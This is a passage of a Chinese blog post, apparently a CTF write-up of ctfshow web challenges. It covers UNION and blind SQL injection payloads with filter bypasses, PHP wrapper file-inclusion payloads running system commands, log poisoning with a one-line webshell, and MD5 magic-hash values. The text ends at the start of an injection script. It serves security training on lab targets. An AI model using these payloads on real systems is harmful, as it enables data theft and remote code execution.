      <meta itemprop="description" content="一条有梦想的咸鱼">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="ctfshow之web专题 | root@wanth3f1ag">
      <meta itemprop="description" content="ctfshow之web专题">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ctfshow之web专题
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-03-10 22:32:06" itemprop="dateCreated datePublished" datetime="2025-03-10T22:32:06+08:00">2025-03-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-01 19:19:20" itemprop="dateModified" datetime="2025-12-01T19:19:20+08:00">2025-12-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>41k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>37 分钟</span>
    </span>
</div>

            <div class="post-description">ctfshow之web专题</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>因为这里的题有些也是比较简单的，所以这里的知识点和做法不会讲述特别多，不会的可以直接看其他文章的题目有写的很详细的</p>
<h1 id="0x02web题目"><a href="#0x02web题目" class="headerlink" title="0x02web题目"></a>0x02web题目</h1><h2 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h2><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="#源码泄露"></a>#源码泄露</h3><p>查看源代码然后拿去进行base64编码就可以拿到flag了</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><h3 id="mysql联合注入"><a href="#mysql联合注入" class="headerlink" title="#mysql联合注入"></a>#mysql联合注入</h3><p>最简单的sql注入</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204212546700.png" alt="image-20241204212546700"></p>
<p>进来是一个，页面源代码也没什么可用的信息，那我们就测试一下</p>
<p>先用永真语句打一下</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>=1&#x27; <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> =<span class="string">&#x27;1&#x27;</span>--+&amp;<span class="attribute">password</span>=1</span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204214741542.png" alt="image-20241204214741542"></p>
<p>可以看到登录成功了，那我们就拿ctfshow作为账号去打一下</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">判断字段数</span><br><span class="line"><span class="keyword">password</span>=<span class="number">1</span>&amp;username=ctfshow<span class="string">&#x27; order by 3--+回显成功</span></span><br><span class="line"><span class="string">password=1&amp;username=ctfshow&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span><span class="comment">--+回显失败</span></span><br><span class="line">证明是三个字段</span><br><span class="line">判断回显位置</span><br><span class="line"><span class="keyword">password</span>=<span class="number">1</span>&amp;username=ctfshow<span class="string">&#x27; union select 1,2,3--+发现2出现在了页面中，那我们用2作为回显位置去注入</span></span><br><span class="line"><span class="string">爆破数据库</span></span><br><span class="line"><span class="string">password=1&amp;username=ctfshow&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span><span class="comment">--+数据库名为web2</span></span><br><span class="line">爆破表名</span><br><span class="line"><span class="keyword">password</span>=<span class="number">1</span>&amp;username=ctfshow<span class="string">&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>web2<span class="string">&#x27;),3--+有flag和user两个表</span></span><br><span class="line"><span class="string">爆破flag表中字段</span></span><br><span class="line"><span class="string">password=1&amp;username=ctfshow&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>)<span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;flag&#x27;</span>),<span class="number">3</span><span class="comment">--+</span></span><br><span class="line">爆破字段中数据</span><br><span class="line"><span class="keyword">password</span>=<span class="number">1</span>&amp;username=ctfshow<span class="string">&#x27; union select 1,(select flag from web2.flag),3--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204215434905.png" alt="image-20241204215434905"></p>
<p>成功拿到flag！</p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><h3 id="include文件包含"><a href="#include文件包含" class="headerlink" title="#include文件包含"></a>#include文件包含</h3><p>更简单的web题</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204215643879.png" alt="image-20241204215643879"></p>
<p>include文件包含</p>
<p>直接用伪协议做试一下</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>但是没什么，应该是文件名不对</p>
<p>那我们用data伪协议去做</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204220259354.png" alt="image-20241204220259354"></p>
<p>读取文件</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">data://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac ctf_go_go_go&#x27;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>成功拿到flag</p>
<p>这里也可以用input伪协议去做，url传入php:&#x2F;&#x2F;input，然后抓包用post传入命令或一句话木马</p>
<p>或者也可以用日志注入，方法有很多，就不赘述了</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><h3 id="日志注入"><a href="#日志注入" class="headerlink" title="#日志注入"></a>#日志注入</h3><p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204220645090.png" alt="image-20241204220645090"></p>
<p>和上一题一样的页面，我们先测试一下刚刚的方法能不能做</p>
<p>好吧页面没反应，应该是过滤了，我们试试input，发现出现了error</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221123622.png" alt="image-20241204221123622"></p>
<p>那就试一下日志注入吧</p>
<p>先看一下服务器的版本</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221222472.png" alt="image-20241204221222472"></p>
<p>是nginx，那就访问nginx下的access.log，url传参</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=<span class="regexp">/var/</span><span class="built_in">log</span>/nginx/access.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221258839.png" alt="image-20241204221258839"></p>
<p>在UA头传入一句话木马</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221511113.png" alt="image-20241204221511113"></p>
<p>然后访问并用蚁剑连接</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204221552019.png" alt="image-20241204221552019"></p>
<p>然后在里面找flag就可以了</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><h3 id="弱比较MD5"><a href="#弱比较MD5" class="headerlink" title="#弱比较MD5"></a>#弱比较MD5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">ctf.show_web5</span><br><span class="line">where is flag?</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web5&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web5&lt;/h2&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h3&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $flag=&quot;&quot;;</span><br><span class="line">        $v1=$_GET[&#x27;v1&#x27;];</span><br><span class="line">        $v2=$_GET[&#x27;v2&#x27;];</span><br><span class="line">        if(isset($v1) &amp;&amp; isset($v2))&#123;</span><br><span class="line">            if(!ctype_alpha($v1))&#123;</span><br><span class="line">                die(&quot;v1 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(!is_numeric($v2))&#123;</span><br><span class="line">                die(&quot;v2 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(md5($v1)==md5($v2))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">        </span><br><span class="line">            echo &quot;where is flag?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>我们只看里面的php代码就行了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">        <span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分析：</p>
<h3 id="ctype-alpha-v1"><a href="#ctype-alpha-v1" class="headerlink" title="ctype_alpha($v1)"></a><code>ctype_alpha($v1)</code></h3><p>在PHP中，<code>ctype_alpha($v1)</code> 函数用于检查字符串 <code>$v1</code> 是否只包含字母字符。如果字符串中的所有字符都是字母（A-Z和a-z），则函数返回 <code>true</code>，否则返回 <code>false</code>。</p>
<h3 id="is-numeric-v2"><a href="#is-numeric-v2" class="headerlink" title="is_numeric($v2)"></a>is_numeric($v2)</h3><p>在 PHP 中，<code>is_numeric($v2)</code> 函数用于检查变量 <code>$v2</code> 的值是否为一个数字或数字字符串。如果 <code>$v2</code> 是一个数字，包括整数或浮点数，或者是表示数字的字符串（比如 <code>&quot;123&quot;</code> 或 <code>&quot;3.14&quot;</code>），则函数返回 <code>true</code>；否则返回 <code>false</code>。</p>
<p>这里的话就是绕过md5验证，要求v1为为字母，v2为数字，并且v1与v2的md5值相同。<br>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0<br>所以只要v1与v2的md5值以0E开头即可。</p>
<p>v1&#x3D;QNKCDZO&amp;v2&#x3D;240610708</p>
<p>这两个的md5值都是0e开头，所以他们的md5值相等</p>
<h3 id="开头为0E（MD5值碰撞）"><a href="#开头为0E（MD5值碰撞）" class="headerlink" title="开头为0E（MD5值碰撞）"></a>开头为0E（MD5值碰撞）</h3><p>字母数字混合类型：</p>
<p>s878926199a</p>
<p>0e545993274517709034328855841020</p>
<p>s155964671a</p>
<p>0e342768416822451524974117254469</p>
<p>s214587387a</p>
<p>0e848240448830537924465865611904</p>
<p>s214587387a</p>
<p>0e848240448830537924465865611904</p>
<p>纯大写字母：</p>
<p>QLTHNDT</p>
<p>0e405967825401955372549139051580</p>
<p>QNKCDZO</p>
<p>0e830400451993494058024219903391</p>
<p>EEIZDOI</p>
<p>0e782601363539291779881938479162</p>
<p>纯数字：</p>
<p>240610708</p>
<p>0e462097431906509019562988736854</p>
<p>4011627063<br>0e485805687034439905938362701775</p>
<p>4775635065<br>0e998212089946640967599450361168</p>
<p>4790555361<br>0e643442214660994430134492464512  </p>
<p>5432453531<br>0e512318699085881630861890526097</p>
<p>5579679820<br>0e877622011730221803461740184915 </p>
<p>5585393579<br>0e664357355382305805992765337023</p>
<p>6376552501<br>0e165886706997482187870215578015  </p>
<p>7124129977<br>0e500007361044747804682122060876<br>7197546197<br>0e915188576072469101457315675502</p>
<p>7656486157      </p>
<p>0e451569119711843337267091732412</p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><h3 id="过滤空格的联合注入"><a href="#过滤空格的联合注入" class="headerlink" title="#过滤空格的联合注入"></a>#过滤空格的联合注入</h3><p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204222916746.png" alt="image-20241204222916746"></p>
<p>是跟前面一样的登录界面</p>
<p>测试一下发现好像有过滤</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204223406033.png" alt="image-20241204223406033"></p>
<p>出现一个sql注入错误，看看过滤了什么</p>
<p>测试后发现过滤了空格，用内联注释绕过</p>
<p>然后发现过滤了–+注释符号，我们换成#</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1&#x27;</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span><span class="meta">#&amp;password=1</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204224151511.png" alt="image-20241204224151511"></p>
<p>这下可以了</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">判断字段数</span><br><span class="line">username=ctfshow&#x27;<span class="comment">/**/</span>order<span class="comment">/**/</span>by<span class="comment">/**/</span><span class="number">3</span><span class="meta">#&amp;password=1字段数为3</span></span><br><span class="line">判断回显位置</span><br><span class="line">username=ctfshow&#x27;<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#&amp;password=1还是一样2出现回显</span></span><br><span class="line">爆破数据库</span><br><span class="line">username=ctfshow&#x27;<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="built_in">database</span>(),<span class="number">3</span><span class="meta">#&amp;password=1数据库为web2</span></span><br><span class="line">爆破表名</span><br><span class="line">username=ctfshow&#x27;<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="built_in">select</span><span class="comment">/**/</span><span class="built_in">group_concat</span>(table_name)<span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="built_in">where</span><span class="comment">/**/</span>table_schema=&#x27;web2&#x27;),<span class="number">3</span><span class="meta">#&amp;password=1出现flag和user表</span></span><br><span class="line">查询flag表下字段</span><br><span class="line">username=ctfshow&#x27;<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="built_in">select</span><span class="comment">/**/</span><span class="built_in">group_concat</span>(column_name)<span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="built_in">where</span><span class="comment">/**/</span>table_name=&#x27;flag&#x27;),<span class="number">3</span><span class="meta">#&amp;password=1出现flag字段</span></span><br><span class="line">爆flag数据</span><br><span class="line">username=ctfshow&#x27;<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="built_in">select</span><span class="comment">/**/</span>flag<span class="comment">/**/</span>from<span class="comment">/**/</span>web2.flag),<span class="number">3</span><span class="meta">#&amp;password=1</span></span><br></pre></td></tr></table></figure>

<p>成功拿到flag</p>
<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><h3 id="数字型-引号过滤"><a href="#数字型-引号过滤" class="headerlink" title="#数字型+引号过滤"></a>#数字型+引号过滤</h3><p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205133922227.png" alt="image-20241205133922227"></p>
<p>不知道是啥，先点开看看，点开后发现url多了一个参数id，感觉是sql注入，而且是数字型</p>
<p>试一下闭合单引号</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205160729258.png" alt="image-20241205160729258"></p>
<p>发现没变化，一开始我以为不是sql注入，后面发现是过滤了单引号,不过对题目没啥影响，只是在后面注入的时候引用名字的时候换成双引号就可以了</p>
<p>这道题还是过滤了空格，试一下永真语句</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205134649149.png" alt="image-20241205134649149"></p>
<p>这里可以看到是注入成功了的</p>
<p>我们再试一下</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205160944283.png" alt="image-20241205160944283"></p>
<p>可以正常回显</p>
<p>判断字段数</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1&#x27;</span><span class="comment">/**/</span>order<span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">4</span><span class="meta">#字段数是3</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205134800958.png" alt="image-20241205134800958"></p>
<p>判断回显位置</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241205161104960.png" alt="image-20241205161104960"></p>
<p>可以看到2和3都有回显，那我们用2进行注入</p>
<p>空格用&#x2F;**&#x2F;进行绕过，单引号用双引号就行</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">爆破数据库</span><br><span class="line">?id=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span>#数据库名为web7</span><br><span class="line">爆破数据库表名</span><br><span class="line">?id=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(<span class="built_in">table_name</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">tables</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=“web7”),<span class="number">3</span>#出现flag,page,<span class="keyword">user</span>三个表</span><br><span class="line">(其实这里的话我一开始不知道是过滤了单引号，我原来的语句是?id=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(<span class="built_in">table_name</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">tables</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=‘web7’),<span class="number">3</span>#然后发现并没有回显，所以才发现是过滤了单引号)</span><br><span class="line">爆破表中字段</span><br><span class="line">?id=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(<span class="built_in">column_name</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">columns</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="built_in">table_name</span>=&quot;flag&quot;),<span class="number">3</span>#出现flag字段</span><br><span class="line">爆破数据</span><br><span class="line">?id=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>web7.flag),<span class="number">3</span>#</span><br></pre></td></tr></table></figure>

<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><h3 id="布尔盲注-过滤逗号"><a href="#布尔盲注-过滤逗号" class="headerlink" title="#布尔盲注+过滤逗号"></a>#布尔盲注+过滤逗号</h3><p>做到这一题，基本可以写简单的注入工具了</p>
<p>还是一样的页面，我们先fuzz一下</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308204915981.png" alt="image-20250308204915981"></p>
<p>union等字符被过滤了，尝试盲注</p>
<p>因为这里的逗号被过滤了，所以我们的盲注语句要稍微改一下</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这是原来的语句</span><br><span class="line"><span class="number">-1</span> <span class="keyword">or</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="string">&#x27;xx&#x27;</span>%<span class="number">23</span></span><br><span class="line">修改后</span><br><span class="line"><span class="number">-1</span> <span class="keyword">or</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>())<span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>))=<span class="string">&#x27;xx&#x27;</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<h3 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h3><h4 id="from-for"><a href="#from-for" class="headerlink" title="from for"></a>from for</h4><p>盲注的时候为了截取字符串，我们往往会使用substr(),mid()。这些子句方法都需要使用到逗号，对于substr()和mid()这两个方法可以使用from for的方式来解决：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>

<p>等价于mid&#x2F;substr(database(),1,1)</p>
<p>前面的爆数据库就是不说了，把盲注的payload改一下就行了</p>
<h3 id="布尔盲注脚本"><a href="#布尔盲注脚本" class="headerlink" title="布尔盲注脚本"></a>布尔盲注脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 